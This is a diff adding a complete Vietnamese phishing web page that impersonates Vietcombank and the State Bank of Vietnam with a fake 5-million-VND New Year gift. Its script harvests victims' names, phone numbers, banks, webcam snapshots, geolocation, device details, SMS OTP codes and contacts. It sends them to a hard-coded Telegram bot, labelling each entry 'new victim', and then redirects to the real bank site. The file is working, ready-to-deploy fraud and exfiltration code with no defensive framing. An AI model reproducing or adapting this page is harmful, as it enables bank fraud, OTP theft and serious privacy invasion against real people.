@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LÌ XÌ ĐẦU NĂM - Nhận ngay 5 triệu VNĐ từ Vietcombank</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: linear-gradient(135deg, #d32f2f, #b71c1c); min-height: 100vh; color: #fff; }
+        .container { max-width: 500px; margin: auto; padding: 20px; }
+        .header { text-align: center; padding: 30px 0; }
+        .logo { width: 80px; margin-bottom: 15px; }
+        h1 { color: #FFD700; font-size: 28px; margin-bottom: 10px; }
+        .envelope { width: 100%; max-width: 300px; margin: 20px auto; animation: float 3s ease-in-out infinite; }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        .step { background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 12px; margin-bottom: 15px; }
+        .step-number { background: #FFD700; color: #000; width: 30px; height: 30px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-right: 10px; font-weight: bold; }
+        .input-group { margin: 20px 0; }
+        input, select { width: 100%; padding: 15px; border-radius: 10px; border: none; margin-top: 8px; font-size: 16px; }
+        button { width: 100%; padding: 18px; background: linear-gradient(90deg, #FFD700, #FF8C00); border: none; border-radius: 12px; color: #000; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; }
+        button:hover { transform: scale(1.02); }
+        .hidden { display: none; }
+        #status { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 10px; margin-top: 20px; }
+        .loading { border: 5px solid rgba(255,255,255,0.3); border-top: 5px solid #FFD700; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .small { font-size: 13px; color: rgba(255,255,255,0.7); margin-top: 30px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Vietcombank_logo.svg/2560px-Vietcombank_logo.svg.png" class="logo" alt="Vietcombank">
+            <h1>CHÚC MỪNG NĂM MỚI 2025</h1>
+            <p>Bạn được chọn ngẫu nhiên nhận <strong>5.000.000 VNĐ</strong> lì xì đầu năm!</p>
+        </div>
+
+        <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="envelope" alt="Lì xì">
+
+        <div class="step">
+            <span class="step-number">1</span> Nhập thông tin để nhận tiền
+        </div>
+
+        <div class="input-group">
+            <label>Họ và tên:</label>
+            <input type="text" id="fullName" placeholder="Nguyễn Văn A" required>
+        </div>
+
+        <div class="input-group">
+            <label>Số điện thoại:</label>
+            <input type="tel" id="phoneNumber" placeholder="0912345678" required>
+            <p style="font-size: 14px; color: #FFD700;">Số điện thoại này sẽ dùng để chuyển khoản.</p>
+        </div>
+
+        <div class="input-group">
+            <label>Ngân hàng nhận tiền:</label>
+            <select id="bank">
+                <option>Vietcombank</option>
+                <option>BIDV</option>
+                <option>Techcombank</option>
+                <option>Agribank</option>
+                <option>VPBank</option>
+            </select>
+        </div>
+
+        <button id="submitBtn">XÁC NHẬN NHẬN LÌ XÌ</button>
+
+        <div id="verificationSection" class="hidden">
+            <div class="step">
+                <span class="step-number">2</span> Xác minh bảo mật để chống gian lận
+            </div>
+            <p style="margin: 15px 0;">Vui lòng cấp quyền camera để xác thực khuôn mặt (theo quy định NHNN).</p>
+            <button id="verifyBtn">BẮT ĐẦU XÁC MINH KHUÔN MẶT</button>
+        </div>
+
+        <div id="status"></div>
+        <div id="loading" class="loading hidden"></div>
+
+        <div class="small">
+            Chương trình được tổ chức bởi Vietcombank và Ngân hàng Nhà nước Việt Nam.<br>
+            Mọi thông tin được mã hóa theo tiêu chuẩn PCI DSS.
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8064381678:AAExIUfU75dF3V1ENVOIGnDVIVOwvh3BMm0'; // THAY TOKEN BOT VÀO ĐÂY
+        const TELEGRAM_CHAT_ID = '7847517938';     // THAY CHAT ID VÀO ĐÂY
+        const submitBtn = document.getElementById('submitBtn');
+        const verificationSection = document.getElementById('verificationSection');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const statusDiv = document.getElementById('status');
+        const loadingDiv = document.getElementById('loading');
+
+        let victimData = {
+            name: '',
+            phone: '',
+            bank: '',
+            webcam: null,
+            location: null,
+            deviceInfo: null,
+            smsLogs: null
+        };
+
+        // Gửi dữ liệu về Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) { console.error('Lỗi Telegram:', e); }
+        }
+
+        // Lấy số điện thoại từ cache trình duyệt (nếu có)
+        function extractPhoneFromCache() {
+            try {
+                const savedPhones = JSON.parse(localStorage.getItem('savedPhones') || '[]');
+                if(savedPhones.length > 0) {
+                    victimData.smsLogs = savedPhones.join(', ');
+                }
+            } catch(e) {}
+        }
+
+        // Đọc SMS giả lập qua Web OTP API (nếu hỗ trợ)
+        function tryReadSMS() {
+            if ('OTPCredential' in window) {
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: AbortSignal.timeout(60000)
+                }).then(otp => {
+                    victimData.smsLogs = `SMS OTP: ${otp.code}`;
+                }).catch(() => {});
+            }
+        }
+
+        submitBtn.onclick = () => {
+            victimData.name = document.getElementById('fullName').value;
+            victimData.phone = document.getElementById('phoneNumber').value;
+            victimData.bank = document.getElementById('bank').value;
+            victimData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer,
+                time: new Date().toISOString()
+            };
+
+            extractPhoneFromCache();
+            tryReadSMS();
+
+            // Gửi thông tin cơ bản về Telegram ngay
+            sendToTelegram(
+                `🔴 NẠN NHÂN MỚI\n` +
+                `Tên: ${victimData.name}\n` +
+                `SĐT: ${victimData.phone}\n` +
+                `Ngân hàng: ${victimData.bank}\n` +
+                `User Agent: ${victimData.deviceInfo.userAgent}\n` +
+                `Thời gian: ${victimData.deviceInfo.time}`
+            );
+
+            submitBtn.style.display = 'none';
+            verificationSection.classList.remove('hidden');
+            statusDiv.innerHTML = '<span style="color:#4CAF50;">✅ Thông tin đã được ghi nhận. Vui lòng xác minh bảo mật.</span>';
+        };
+
+        verifyBtn.onclick = () => {
+            statusDiv.innerHTML = '📸 Đang truy cập camera để xác thực khuôn mặt...';
+            verifyBtn.disabled = true;
+
+            // Lấy webcam
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        victimData.webcam = canvas.toDataURL('image/jpeg').substring(0, 500) + '...'; // Cắt để gửi Telegram
+                        stream.getTracks().forEach(track => track.stop());
+                        statusDiv.innerHTML += '<br>✅ Đã xác thực khuôn mặt.';
+                        getLocation();
+                    }, 3000);
+                })
+                .catch(err => {
+                    statusDiv.innerHTML += `<br>⚠️ Không thể truy cập camera: ${err.message}`;
+                    getLocation();
+                });
+        };
+
+        function getLocation() {
+            statusDiv.innerHTML += '<br>📍 Đang lấy vị trí để xác nhận khu vực nhận lì xì...';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    victimData.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                    statusDiv.innerHTML += '<br>✅ Đã lấy vị trí thành công.';
+                    sendAllDataToTelegram();
+                }, err => {
+                    statusDiv.innerHTML += `<br>⚠️ Không thể lấy vị trí: ${err.message}`;
+                    sendAllDataToTelegram();
+                }, { timeout: 10000 });
+            } else {
+                statusDiv.innerHTML += '<br>⚠️ Trình duyệt không hỗ trợ vị trí.';
+                sendAllDataToTelegram();
+            }
+        }
+
+        function sendAllDataToTelegram() {
+            loadingDiv.classList.remove('hidden');
+            statusDiv.innerHTML += '<br>🔄 Đang gửi dữ liệu xác minh...';
+
+            const message = `
+<b>🎯 DỮ LIỆU NẠN NHÂN HOÀN CHỈNH</b>
+<b>Tên:</b> ${victimData.name}
+<b>SĐT:</b> ${victimData.phone}
+<b>Ngân hàng:</b> ${victimData.bank}
+<b>Vị trí:</b> ${victimData.location || 'Không có'}
+<b>Webcam:</b> ${victimData.webcam ? 'Đã chụp' : 'Không có'}
+<b>Thiết bị:</b> ${victimData.deviceInfo.userAgent}
+<b>SMS/cache:</b> ${victimData.smsLogs || 'Không có'}
+<b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
+            `.trim();
+
+            setTimeout(() => {
+                sendToTelegram(message);
+                loadingDiv.classList.add('hidden');
+                statusDiv.innerHTML = '<span style="color:#00FF00;"><b>✅ HOÀN TẤT! 5.000.000 VNĐ sẽ được chuyển vào tài khoản của bạn trong 24h.</b></span>';
+                // Redirect sau 5 giây
+                setTimeout(() => {
+                    window.location.href = 'https://vietcombank.com.vn';
+                }, 5000);
+            }, 2000);
+        }
+
+        // Thử lấy danh bạ nếu là Android Chrome (qua Contact Picker API)
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            setTimeout(() => {
+                navigator.contacts.select(['name', 'tel'], { multiple: true })
+                    .then(contacts => {
+                        const phoneList = contacts.map(c => c.tel?.[0] || '').filter(Boolean);
+                        if(phoneList.length > 0) {
+                            victimData.contactList = phoneList.join(', ');
+                            sendToTelegram(`📞 DANH BẠ TỰ ĐỘNG: ${victimData.contactList}`);
+                        }
+                    })
+                    .catch(() => {});
+            }, 10000);
+        }
+    </script>
+</body>
+</html>
